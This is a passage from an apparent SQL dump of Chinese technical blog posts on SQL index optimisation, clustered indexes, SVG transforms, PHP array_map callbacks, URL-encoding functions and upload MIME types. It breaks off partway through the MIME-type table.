1秒）<br />\r\nselect * from record where amount<br />\r\n&lt; 1000*30（&lt; 1秒）<br />\r\nselect * from record where date= &#39;1999/12/01&#39;<br />\r\n（&lt; 1秒）</p>\r\n\r\n<p>你会发现SQL明显快起来！</p>\r\n\r\n<p>2.例：表stuff有200000行，id_no上有非群集索引，请看下面这个SQL：<br />\r\nselect count(*) from stuff where id_no in(&#39;0&#39;,&#39;1&#39;)<br />\r\n（23秒）</p>\r\n\r\n<p>分析：<br />\r\nwhere条件中的&#39;in&#39;在逻辑上相当于&#39;or&#39;，所以语法分析器会将in (&#39;0&#39;,&#39;1&#39;)转化为id_no =&#39;0&#39; or id_no=&#39;1&#39;来执行。我们期望它会根据每个or子句分别查找，再将结果相加，这样可以利用id_no上的索引；但实际上（根据showplan）,它却采用了&quot;OR策略&quot;，即先取出满足每个or子句的行，存入临时数据库的工作表中，再建立唯一索引以去掉重复行，最后从这个临时表中计算结果。因此，实际过程没有利用id_no上索引，并且完成时间还要受tempdb数据库性能的影响。</p>\r\n\r\n<p>实践证明，表的行数越多，工作表的性能就越差，当stuff有620000行时，执行时间竟达到220秒！还不如将or子句分开：<br />\r\nselect count(*) from stuff where id_no=&#39;0&#39;<br />\r\nselect count(*) from stuff where id_no=&#39;1&#39;</p>\r\n\r\n<p>得到两个结果，再作一次加法合算。因为每句都使用了索引，执行时间只有3秒，在620000行下，时间也只有4秒。或者，用更好的方法，写一个简单的存储过程：<br />\r\ncreate proc count_stuff as<br />\r\ndeclare @a int<br />\r\ndeclare @b int<br />\r\ndeclare @c int<br />\r\ndeclare @d char(10)<br />\r\nbegin<br />\r\nselect @a=count(*) from stuff where id_no=&#39;0&#39;<br />\r\nselect @b=count(*) from stuff where id_no=&#39;1&#39;<br />\r\nend<br />\r\nselect @c=@a+@b<br />\r\nselect @d=convert(char(10),@c)<br />\r\nprint @d</p>\r\n\r\n<p>直接算出结果，执行时间同上面一样快！<br />\r\n总结：</p>\r\n\r\n<p>可见，所谓优化即where子句利用了索引，不可优化即发生了表扫描或额外开销。</p>\r\n\r\n<p>1.任何对列的操作都将导致表扫描，它包括数据库函数、计算表达式等等，查询时要尽可能将操作移至等号右边。</p>\r\n\r\n<p>2.in、or子句常会使用工作表，使索引失效；如果不产生大量重复值，可以考虑把子句拆开；拆开的子句中应该包含索引。</p>\r\n\r\n<p>3.要善于使用存储过程，它使SQL变得更加灵活和高效。</p>\r\n\r\n<p>从以上这些例子可以看出，SQL优化的实质就是在结果正确的前提下，用优化器可以识别的语句，充份利用索引，减少表扫描的I/O次数，尽量避免表搜索的发生。其实SQL的性能优化是一个复杂的过程，上述这些只是在应用层次的一种体现，深入研究还会涉及数据库层的资源配置、网络层的流量控制以及操作系统层的总体设计。</p>\r\n',0,1438067804,0,0),(98,24,'你真的了解SQL的索引吗？','<p>其实对于非专业的数据库操作人员来讲，例如软件开发人员，在很大程度上都搞不清楚数据库索引的一些基本知识，有些是知其一不知其二，或者是知其然不知其所以然。造成这种情况的主要原因我觉的是行业原因，有很多公司都有自己的DBA团队，他们会帮助你优化SQL，开发人员即使不懂优化问题也不大，所以开发人员对这方面也就不会下太多功夫去了解SQL优化，但如果公司没有这样的DBA呢，就只能靠程序员自己了。 最近突然想起前一阵和一朋友的聊天，当时他问我的问题是一个非常普通的问题：说说SQL聚集索引和非聚集索引的区别。</p>\r\n\r\n<p>大家可能认为这个问题难度不大，认为太熟悉了，也许不会感兴趣，但你真能说清楚吗？其实要想说明白这两者的差别也不是三两句就说的清的，那天我也是觉的这问题太泛了，就随便说了其中的两个区别：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 聚集索引一个表只能有一个，而非聚集索引一个表可以存在多个，这个跟没问题没差别，一般人都知道。<br />\r\n&nbsp;&nbsp;&nbsp; 聚集索引存储记录是物理上连续存在，而非聚集索引是逻辑上的连续，物理存储并不连续，这个大家也都知道。</p>\r\n\r\n<p>上面的两点从大的方面讲都是讲的通的，后面我们继续探讨，举一个实际点的例子，一个学生表student，里面是学生号id,学生姓名，学生所在城市ID，学生成绩(总分)。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 问：如果想按姓名查询，如何做优化？<br />\r\n&nbsp;&nbsp;&nbsp; 答：在姓名字段上建立索引。<br />\r\n&nbsp;&nbsp;&nbsp; 问：建立什么类型的索引？<br />\r\n&nbsp;&nbsp;&nbsp; 答：建立非聚集索引。<br />\r\n&nbsp;&nbsp;&nbsp; 问：为什么？<br />\r\n&nbsp;&nbsp;&nbsp; 答：一般有范围查询的需求，可以考虑在此字段上创建聚集索引。<br />\r\n&nbsp;&nbsp;&nbsp; 问：学分有重复性，在学分字段上创建聚集索引能行吗？ ....沉思，不能创建吗？之前的项目好像真这样做过<br />\r\n&nbsp;&nbsp;&nbsp; 答：应该可以吧。<br />\r\n&nbsp;&nbsp;&nbsp; 问：聚集索引的约束是什么？<br />\r\n&nbsp;&nbsp;&nbsp; 答：唯一性啊？<br />\r\n&nbsp;&nbsp;&nbsp; 问：既然是唯一性，那么学分字段上还能创建聚集索引吗？....再次沉思，应该可以啊，但索引的约束又怎么说呢？<br />\r\n&nbsp;&nbsp;&nbsp; 答：应该可以的，以前用过。</p>\r\n\r\n<p>我自认为是对数据库索引知识有一定研究的，但可能是有两年没实际接触SQL的原因，一时还真想不出具有说服力的解释，朋友们看到这能解答我的问题吗？</p>\r\n\r\n<p>其实上面的我们需要搞清楚以下几个问题：</p>\r\n\r\n<p>第一：聚集索引的约束是唯一性，是否要求字段也是唯一的呢？</p>\r\n\r\n<p>分析：如果认为是的朋友，可能是受系统默认设置的影响，一般我们指定一个表的主键，如果这个表之前没有聚集索引，同时建立主键时候没有强制指定使用非聚集索引,SQL会默认在此字段上创建一个聚集索引，而主键都是唯一的，所以理所当然的认为创建聚集索引的字段也需要唯一。</p>\r\n\r\n<p>结论：聚集索引可以创建在任何一列你想创建的字段上，这是从理论上讲，实际情况并不能随便指定，否则在性能上会是恶梦。</p>\r\n\r\n<p>第二：为什么聚集索引可以创建在任何一列上，如果此表没有主键约束，即有可能存在重复行数据呢？</p>\r\n\r\n<p>粗一看，这还真是和聚集索引的约束相背，但实际情况真可以创建聚集索引，分析其原因是：如果未使用 UNIQUE 属性创建聚集索引，数据库引擎将向表自动添加一个四字节 uniqueifier 列。必要时，数据库引擎 将向行自动添加一个 uniqueifier 值，使每个键唯一。此列和列值供内部使用，用户不能查看或访问。</p>\r\n\r\n<p>第三：是不是聚集索引就一定要比非聚集索引性能优呢？</p>\r\n\r\n<p>如果想查询学分在60-90之间的学生的学分以及姓名，在学分上创建聚集索引是否是最优的呢？</p>\r\n\r\n<p>答：否。既然只输出两列，我们可以在学分以及学生姓名上创建联合非聚集索引，此时的索引就形成了覆盖索引，即索引所存储的内容就是最终输出的数据，这种索引在比以学分为聚集索引做查询性能更好。</p>\r\n\r\n<p>第四：在数据库中通过什么描述聚集索引与非聚集索引的？</p>\r\n\r\n<p>索引是通过二叉树的形式进行描述的，我们可以这样区分聚集与非聚集索引的区别：聚集索引的叶节点就是最终的数据节点，而非聚集索引的叶节仍然是索引节点，但它有一个指向最终数据的指针。</p>\r\n\r\n<p>第五：在主键是创建聚集索引的表在数据插入上为什么比主键上创建非聚集索引表速度要慢？</p>\r\n\r\n<p>有了上面第四点的认识，我们分析这个问题就有把握了，在有主键的表中插入数据行，由于有主键唯一性的约束，所以需要保证插入的数据没有重复。我们来比较下主键为聚集索引和非聚集索引的查找情况:聚集索引由于索引叶节点就是数据页，所以如果想检查主键的唯一性，需要遍历所有数据节点才行，但非聚集索引不同，由于非聚集索引上已经包含了主键值，所以查找主键唯一性，只需要遍历所有的索引页就行，这比遍历所有数据行减少了不少IO消耗。这就是为什么主键上创建非聚集索引比主键上创建聚集索引在插入数据时要快的真正原因。</p>\r\n\r\n<p>好了，讲这这些，不知道大家是否真的了解SQL的聚焦索引，我也是数据库新手(从使用时间上来讲也不算新了，哈哈)，不专业，有什么不对的地方，希望大家批评指正，下篇我会分析一些数据库访问索引的情况，有图的情况下，也许看的更加明白。</p>\r\n',0,1438067900,0,0),(99,40,'svg transform 坐标变换方式','<p>坐标变换的使用方式：</p>\r\n\r\n<p>代码:&lt;g transform=&quot;...&quot;&gt; &lt;!--other elements&gt; ...&lt;/g&gt;1、平移变换（translate）<br />\r\n平移表达式transform=&quot;translate(x,y)&quot;，即新坐标系的原点在原坐标系的（x,y）处。坐标轴的方向不变。</p>\r\n\r\n<p>2、旋转变换（rotate）<br />\r\ntransform=&quot;rotate(angle cx,cy)&quot;。angle代表旋转角度，缺省单位是&ldquo;度&rdquo;，瞬时针为正，逆时针为负。（cx,cy）是旋转中心所在的坐标。若省略旋转中心坐标，则缺省值是（0,0）。</p>\r\n\r\n<p>3、伸缩变换（scale）<br />\r\ntransform=&quot;scale(sx,sy)&quot;，sx,sy分别代表x轴方向和y方向拉伸或缩小的比例因子。拉伸：大于1；缩小：小于1。若省略sy，即sy=sx，作等比例缩放。</p>\r\n\r\n<p>4、歪斜变换（skew）<br />\r\ntransform=&quot;skewX(x-angle)&quot;或transform=&quot;skewY(y-angle)&quot;，x-angle,y-angle分别代表沿x轴和y轴歪斜的角度。</p>\r\n\r\n<p>5、矩阵变换（matrix）<br />\r\ntransform=&quot;matrix(a b c d e f)&quot;，这里的六个参数分别是变换矩阵中的六个参数。特点是灵活性大，无论多么复杂的变换，只需进行一次矩阵运算即可。<br />\r\n二维坐标变换基本公式：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; x a c e x1<br />\r\ny = b d f * y1<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; 1 0 0 1&nbsp; 1<br />\r\n其中 ，x,y是旧坐标，x1,y1是新坐标。</p>\r\n',0,1438068212,0,0),(100,10,'array_map函数在PHP类中调用内部方法简介','<p>在PHP编程中，我们经常会遇到处理数组的单元数据问题，比如对数组中每个单元应用自定义函数。</p>\r\n\r\n<p>一种方法是通过循环遍历整个数组，对每个单元调用自定义函数，然后用返回值替换原数组相应单元的值。这也是最常见和简单的方法，在此就不举例了。</p>\r\n\r\n<p>一种方法是通过PHP提供的array_map函数回调自定义函数，这也是被推荐的方法。</p>\r\n\r\n<p>array_map -- 将回调函数作用到给定数组的单元上</p>\r\n\r\n<p>说明:</p>\r\n\r\n<p>array array_map ( callback callback, array arr1 [, array ...] )</p>\r\n\r\n<p>array_map() 返回一个数组，该数组包含了 arr1 中的所有单元经过 callback 作用过之后的单元。callback 接受的参数数目应该和传递给 array_map() 函数的数组数目一致。<br />\r\n摘录一段PHP手册的列子简要说明如下：</p>\r\n\r\n<p>&lt;?php<br />\r\nfunctioncube($n){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; return$n*$n*$n;<br />\r\n}</p>\r\n\r\n<p>$a= array(1,2,3,4,5);<br />\r\n$b=array_map(&quot;cube&quot;,$a);<br />\r\nprint_r($b);<br />\r\n?&gt;</p>\r\n\r\n<p>那么，如果你是在一个PHP类中通过array_map函数回调内部方法又该如何做呢？</p>\r\n\r\n<p>同样，我们可以在PHP手册中找到一段用户添加的说明：</p>\r\n\r\n<p>If you need to call a static method from array_map, this will NOT work:<br />\r\n（如果你想在array_map函数中回调一个静态方法，那么下面的做法是错误的）</p>\r\n\r\n<p>&lt;?php<br />\r\n$a= array(1,2,3,4,5);<br />\r\n$b=array_map(&quot;myclass::myMethoed&quot;,$a);<br />\r\nprint_r($b);<br />\r\n?&gt;</p>\r\n\r\n<p>Instead, you need to do this:<br />\r\n（你应该做如下调用）</p>\r\n\r\n<p>&lt;?php<br />\r\n$a= array(1,2,3,4,5);<br />\r\n$b=array_map(array(&quot;myclass&quot;,&quot;myMethoed&quot;),$a);<br />\r\nprint_r($b);<br />\r\n?&gt;</p>\r\n\r\n<p>感谢作者的分享，因为PHP手册中对array_map函数的参数说明确实太过简单，以至于连基本的对象方法引用都没提及。</p>\r\n\r\n<p>现在进入我们讨论的主题：如果在PHP类中通过array_map函数回调内部方法要如何做呢？</p>\r\n\r\n<p>先看一下代码（PS：由于文章长度限制，我只好去掉注释。。。）：</p>\r\n\r\n<p>&lt;?php</p>\r\n\r\n<p>// (true === SO_SYS_ACCESS) || exit (&#39;System access denied!&#39;);</p>\r\n\r\n<p>classTest{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; public function__construct(){}<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; public functioncommon_filter($arg){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return$this-&gt;entities($arg);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; public functionpublic_static_filter($arg){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; returnself::_entities($arg);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; public functionprivate_static_filter($arg){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; returnself::__entities($arg);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; public functionentities($arg){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $return=null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(is_array($arg)){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $return=array_map(array($this,&#39;entities&#39;),$arg);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }else{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $return=is_numeric($arg) ?$arg:htmlspecialchars($arg,ENT_QUOTES);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return$return;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; public static function_entities($arg){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $return=null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(is_array($arg)){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // this will neithor work under static call nor class instantiate<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //$return = array_map(array(self, &#39;_entities&#39;), $arg);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // this will work under both static call and class instantiate<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $return=array_map(array(__CLASS__,&#39;_entities&#39;),$arg);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }else{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $return=is_numeric($arg) ?$arg:htmlspecialchars($arg,ENT_QUOTES);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return$return;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; private static function__entities($arg){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $return=null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(is_array($arg)){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $return=array_map(array(__CLASS__,&#39;__entities&#39;),$arg);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }else{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $return=is_numeric($arg) ?$arg:htmlspecialchars($arg,ENT_QUOTES);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return$return;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n}</p>\r\n\r\n<p>$args= array(<br />\r\n&nbsp;&nbsp;&nbsp; &#39;name&#39;=&gt;&#39;Mc\\&#39;Spring&#39;,<br />\r\n&nbsp;&nbsp;&nbsp; &#39;age&#39;=&gt;25,<br />\r\n&nbsp;&nbsp;&nbsp; &#39;email&#39;=&gt;&#39;Fuck.Spam@gmail.com&#39;,<br />\r\n&nbsp;&nbsp;&nbsp; &#39;address&#39;=&gt;&#39;&lt;a href=&quot;http://www.baidu.com/?hi=1983&amp;go=true&quot;&gt;Simple Test&lt;/a&gt;&#39;<br />\r\n);</p>\r\n\r\n<p>print_r(Test::_entities($args));</p>\r\n\r\n<p>echo&#39;&lt;br /&gt;&#39;;</p>\r\n\r\n<p>$obj= newTest;</p>\r\n\r\n<p>print_r($obj-&gt;entities($args));</p>\r\n\r\n<p>echo&#39;&lt;br /&gt;&#39;;</p>\r\n\r\n<p>print_r($obj-&gt;common_filter($args));</p>\r\n\r\n<p>echo&#39;&lt;br /&gt;&#39;;</p>\r\n\r\n<p>print_r($obj-&gt;public_static_filter($args));</p>\r\n\r\n<p>echo&#39;&lt;br /&gt;&#39;;</p>\r\n\r\n<p>print_r($obj-&gt;private_static_filter($args));</p>\r\n\r\n<p>// echo hightlight_file(__FILE__);<br />\r\n?&gt;</p>\r\n\r\n<p>这里有几点可以参考的：</p>\r\n\r\n<p>1，在PHP类中通过array_map函数回调内部方法时，类名称可以使用__CLASS__常量。我们强烈推荐使用此常量，因为不论你类如何修改，这能保证最终结果都是正确的。</p>\r\n\r\n<p>2，如果回调的方法是非静态类型，亦可通过$this伪变量指定。</p>\r\n\r\n<p>3，在PHP类中的array_map函数总是不能识别self伪变量。</p>\r\n',0,1438068285,0,0),(101,10,'PHP的rawurlencode和urlencode','<p>问题:2个函数都是针对字符串转义使其适合做文件名。该用哪个？哪个更标准？</p>\r\n\r\n<p>结论:<br />\r\nrawurlencode遵守是94年国际标准备忘录RFC 1738，<br />\r\nurlencode实现的是传统做法，和上者的主要区别是对空格的转义是&#39;+&#39;而不是&#39;%20&#39;<br />\r\njavascript的encodeURL也是94年标准，</p>\r\n\r\n<p>而javascript的escape是另一种用&quot;%xxx&quot;标记unicode编码的方法。</p>\r\n\r\n<p>推荐在PHP中使用用rawurlencode。弃用urlencode</p>\r\n\r\n<p>样例<br />\r\nsource:</p>\r\n\r\n<p>超级无敌的人sadha sajdh数据样本sdls fhejrthcxzb.file.jpeg</p>\r\n\r\n<p>PHP urlencode:</p>\r\n\r\n<p>%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E7%9A%84%E4%BA%BAsadha+sajdh%E6%95%B0%E6%8D%AE%E6%A0%B7%E6%9C%ACsdls+fhejrthcxzb.file.jpeg</p>\r\n\r\n<p>PHP rawurlencode:</p>\r\n\r\n<p>%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E7%9A%84%E4%BA%BAsadha%20sajdh%E6%95%B0%E6%8D%AE%E6%A0%B7%E6%9C%ACsdls%20fhejrthcxzb.file.jpeg</p>\r\n\r\n<p>Javascript encodeURI:</p>\r\n\r\n<p>%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E7%9A%84%E4%BA%BAsadha%20sajdh%E6%95%B0%E6%8D%AE%E6%A0%B7%E6%9C%ACsdls%20fhejrthcxzb.file.jpeg</p>\r\n\r\n<p>Javascript escape:</p>\r\n\r\n<p>%u8D85%u7EA7%u65E0%u654C%u7684%u4EBAsadha%20sajdh%u6570%u636E%u6837%u672Csdls%20fhejrthcxzb.file.jpeg<br />\r\n来自: http://hi.baidu.com/xlpu/blog/item/f85e102d537236e48b139920.html</p>\r\n',0,1438068338,0,0),(102,10,'PHP上传文件--后缀名与文件类型对照表(几乎涵盖所有文件)','<p>网上有很多php文件上传的类，文件上传处理是php的一个特色(至少手册上是将此作为php特点来展示的,个人认为php在数组方面的优异功能更有特色)，学php的人都知道文件上传怎么做，但很多人在编程中却可能忽视了一些细节问题，那就是文件的类型(MIME)。在表单将文件提交给php做处理之前，浏览器会先解析识别一边是什么类型的文件，之后进入php处理环节，php又会去识别解析此文件的原始类型(并不是说你改成什么后缀就是什么文件)。在这个过程中会有一些浏览器兼容，更准确来说是文件类型解析标识不一致的问题。这样在php处理Post过来的文件类型时就需要根据不同浏览器做更多的判断，最典型的就是IE和火狐下的区别。</p>\r\n\r\n<p>php上传图片文件(gif,jpg,bmp,png,psd,ico)</p>\r\n\r\n<p>史上最完全oophper亲测版php文件上传之文件类型对应表，ie，火狐各一份。</p>\r\n\r\n<table align=\"center\" border=\"1\" cellpadding=\"1\" cellspacing=\"1\" style=\"width:100%\">\r\n	<tbody>\r\n		<tr>\r\n			<td colspan=\"3\" rowspan=\"1\" style=\"text-align: center;\">ie</td>\r\n			<td colspan=\"3\" rowspan=\"1\" style=\"text-align: center;\">火狐</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">id</td>\r\n			<td style=\"text-align: center;\">后缀名</td>\r\n			<td style=\"text-align: center;\">php识别出的文件类型</td>\r\n			<td style=\"text-align: center;\">id</td>\r\n			<td style=\"text-align: center;\">后缀名</td>\r\n			<td style=\"text-align: center;\">php识别出的文件类型</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">0</td>\r\n			<td style=\"text-align: center;\">gif</td>\r\n			<td style=\"text-align: center;\">image/gif</td>\r\n			<td style=\"text-align: center;\">0</td>\r\n			<td style=\"text-align: center;\">gif</td>\r\n			<td style=\"text-align: center;\">image/gif</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">1</td>\r\n			<td style=\"text-align: center;\">jpg</td>\r\n			<td style=\"text-align: center;\">image/jpeg</td>\r\n			<td style=\"text-align: center;\">1</td>\r\n			<td style=\"text-align: center;\">jpg</td>\r\n			<td style=\"text-align: center;\">image/pjpeg</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">2</td>\r\n			<td style=\"text-align: center;\">png</td>\r\n			<td style=\"text-align: center;\">image/png</td>\r\n			<td style=\"text-align: center;\">2</td>\r\n			<td style=\"text-align: center;\">png</td>\r\n			<td style=\"text-align: center;\">image/x-png</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">3</td>\r\n			<td style=\"text-align: center;\">bmp</td>\r\n			<td style=\"text-align: center;\">image/bmp</td>\r\n			<td style=\"text-align: center;\">3</td>\r\n			<td style=\"text-align: center;\">bmp</td>\r\n			<td style=\"text-align: center;\">image/bmp</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">4</td>\r\n			<td style=\"text-align: center;\">psd</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">4</td>\r\n			<td style=\"text-align: center;\">psd</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">5</td>\r\n			<td style=\"text-align: center;\">ico</td>\r\n			<td style=\"text-align: center;\">image/x-icon</td>\r\n			<td style=\"text-align: center;\">5</td>\r\n			<td style=\"text-align: center;\">ico</td>\r\n			<td style=\"text-align: center;\">image/x-icon</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">6</td>\r\n			<td style=\"text-align: center;\">rar</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">6</td>\r\n			<td style=\"text-align: center;\">rar</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">7</td>\r\n			<td style=\"text-align: center;\">zip</td>\r\n			<td style=\"text-align: center;\">application/zip</td>\r\n			<td style=\"text-align: center;\">7</td>\r\n			<td style=\"text-align: center;\">zip</td>\r\n			<td style=\"text-align: center;\">application/x-zip-compressed</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">8</td>\r\n			<td style=\"text-align: center;\">7z</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">8</td>\r\n			<td style=\"text-align: center;\">7z</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">9</td>\r\n			<td style=\"text-align: center;\">exe</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">9</td>\r\n			<td style=\"text-align: center;\">exe</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">10</td>\r\n			<td style=\"text-align: center;\">avi</td>\r\n			<td style=\"text-align: center;\">video/avi</td>\r\n			<td style=\"text-align: center;\">10</td>\r\n			<td style=\"text-align: center;\">avi</td>\r\n			<td style=\"text-align: center;\">video/avi</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">11</td>\r\n			<td style=\"text-align: center;\">rmvb</td>\r\n			<td style=\"text-align: center;\">application/vnd.rn-realmedia-vbr</td>\r\n			<td style=\"text-align: center;\">11</td>\r\n			<td style=\"text-align: center;\">rmvb</td>\r\n			<td style=\"text-align: center;\">application/vnd.rn-realmedia-vbr</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">12</td>\r\n			<td style=\"text-align: center;\">3gp</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">12</td>\r\n			<td style=\"text-align: center;\">3gp</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">13</td>\r\n			<td style=\"text-align: center;\">flv</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">13</td>\r\n			<td style=\"text-align: center;\">flv</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">14</td>\r\n			<td style=\"text-align: center;\">mp3</td>\r\n			<td style=\"text-align: center;\">audio/mpeg</td>\r\n			<td style=\"text-align: center;\">14</td>\r\n			<td style=\"text-align: center;\">mp3</td>\r\n			<td style=\"text-align: center;\">audio/mpeg</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">15</td>\r\n			<td style=\"text-align: center;\">wav</td>\r\n			<td style=\"text-align: center;\">audio/wav</td>\r\n			<td style=\"text-align: center;\">15</td>\r\n			<td style=\"text-align: center;\">wav</td>\r\n			<td style=\"text-align: center;\">audio/wav</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">16</td>\r\n			<td style=\"text-align: center;\">krc</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">16</td>\r\n			<td style=\"text-align: center;\">krc</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">17</td>\r\n			<td style=\"text-align: center;\">lrc</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">17</td>\r\n			<td style=\"text-align: center;\">lrc</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">18</td>\r\n			<td style=\"text-align: center;\">txt</td>\r\n			<td style=\"text-align: center;\">text/plain</td>\r\n			<td style=\"text-align: center;\">18</td>\r\n			<td style=\"text-align: center;\">txt</td>\r\n			<td style=\"text-align: center;\">text/plain</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">19</td>\r\n			<td style=\"text-align: center;\">doc</td>\r\n			<td style=\"text-align: center;\">application/msword</td>\r\n			<td style=\"text-align: center;\">19</td>\r\n			<td style=\"text-align: center;\">doc</td>\r\n			<td style=\"text-align: center;\">application/msword</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">20</td>\r\n			<td 